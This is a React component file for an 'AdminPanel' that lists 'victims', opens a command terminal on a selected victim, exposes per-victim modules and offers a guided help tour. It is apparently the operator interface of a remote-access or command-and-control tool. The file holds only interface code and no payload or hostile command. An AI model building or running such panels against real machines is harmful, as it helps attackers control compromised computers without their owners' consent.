'use client';
import React, { useState } from 'react';
import { VictimList } from '@/Components/VictimList';
import { Terminal } from '@/Components/Terminal';
import { User } from '@/Interfaces/User';
import { driver } from 'driver.js';
import 'driver.js/dist/driver.css';

export default function AdminPanel() {
  const [selectedUser, setSelectedUser] = useState<User | null>(null);
  const [modules, setModules] = useState<Record<string, any>>({});

  const startTour = () => {
    const driverObj = driver({
      animate: true,
      showProgress: true,
      steps: [
        {
          element: '#terminal-input',
          popover: {
            title: 'Terminal Input',
            description: 'Type your commands here and press Enter to execute.',
            position: 'top',
          },
        },
        ...Object.keys(modules).map((moduleName) => ({
          element: `#module-btn-${moduleName}`,
          popover: {
            title: `${moduleName.charAt(0).toUpperCase() + moduleName.slice(1)} Module`,
            description: modules[moduleName]?.help || `No documentation available for ${moduleName}.`,
            position: 'right',
          },
        })),
      ],
    });
    driverObj.drive();
  };

  return (
    <div className="h-screen overflow-hidden bg-black p-4 text-green-500 font-mono relative">
      <div className="h-full grid grid-cols-3 gap-1">
        <div className="col-span-1 h-full overflow-hidden">
          <VictimList selectedUser={selectedUser} setSelectedUser={setSelectedUser} />
        </div>
        <div className="col-span-2 h-full overflow-hidden">
          {selectedUser ? (
            <Terminal selectedUser={selectedUser} setModules={setModules} />
          ) : (
            <div className="h-full flex flex-col items-center justify-center">
              <p className="text-xl font-semibold">No victim selected.</p>
              <p className="text-lg font-semibold">
                Please select a victim from the list on the left.
              </p>
            </div>
          )}
        </div>
      </div>
      <button
        onClick={startTour}
        className="fixed bottom-4 left-4 bg-green-600 text-black px-4 py-2 rounded hover:bg-green-400"
      >
        Help
      </button>
    </div>
  );
}